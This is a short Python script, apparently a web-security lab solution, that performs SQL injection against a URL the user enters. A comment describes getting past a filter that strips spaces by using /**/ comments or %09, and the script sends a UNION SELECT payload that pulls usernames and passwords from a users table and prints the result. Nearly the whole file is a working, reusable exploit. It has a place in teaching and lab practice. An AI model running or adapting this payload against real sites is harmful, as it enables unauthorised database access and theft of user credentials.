import requests
'''in this lab following line removing spaces 

# Remove spaces from input
query = query.replace(" ", "")

We need to bypass this restriction to solve the lab. The space character restriction can be bypassed using several substitutions, such as the following:
/**/ %09 and many more 

'''
payload = { "user": "admin'/**/UNION/**/SELECT/**/username,/**/password,/**/NULL/**/FROM/**/users--"}
print("Enter url:")
url = input()
get_response = requests.get(url, params=payload)
print ("SQL Injection");
# Printing only the status code
print(get_response.content)
